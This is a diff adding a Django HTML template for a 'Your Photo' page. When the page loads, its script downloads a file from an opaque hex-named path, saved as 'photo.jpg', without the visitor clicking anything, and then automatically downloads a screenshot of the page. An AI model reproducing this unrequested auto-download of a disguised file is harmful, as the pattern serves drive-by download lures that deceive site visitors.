@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Your Photo</title>
+    {% load static %}
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background: #f5f5f5;
+            padding: 50px;
+        }
+        .photo-container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 5px;
+        }
+        h1 {
+            color: #333;
+        }
+        .download-btn {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            margin: 20px 0;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="photo-container">
+        <h1>Welcome! Here's Your Photo</h1>
+        
+        <!-- Replace with your actual photo path -->
+        <img src="{% static 'images/photo.jpeg' %}" alt="Your Photo" id="photo">
+        
+        <br>
+        <button class="download-btn" onclick="downloadPhoto()">Download Photo</button>
+        
+        <p style="color: #666; margin-top: 20px;">
+            Photo will automatically download in few seconds...
+        </p>
+    </div>
+
+    <!-- Auto screenshot script using html2canvas -->
+    <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
+    <script>
+        // Auto download photo after page load
+        function downloadPhoto() {
+            var link = document.createElement('a');
+            link.href = '/0c06161804584442650f1c0e1f10/';
+            link.download = 'photo.jpg';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+        
+        // Auto take screenshot of the page
+        function takeScreenshot() {
+            html2canvas(document.body).then(canvas => {
+                var link = document.createElement('a');
+                link.download = 'screenshot.png';
+                link.href = canvas.toDataURL('image/png');
+                link.click();
+            });
+        }
+        
+        // Auto download photo and take screenshot
+        window.onload = function() {
+            // Wait 2 seconds then download photo
+            setTimeout(function() {
+                downloadPhoto();
+                
+                // Take screenshot after another 2 seconds
+                setTimeout(function() {
+                    takeScreenshot();
+                }, 2000);
+            }, 2000);
+        };
+    </script>
+</body>
+</html>
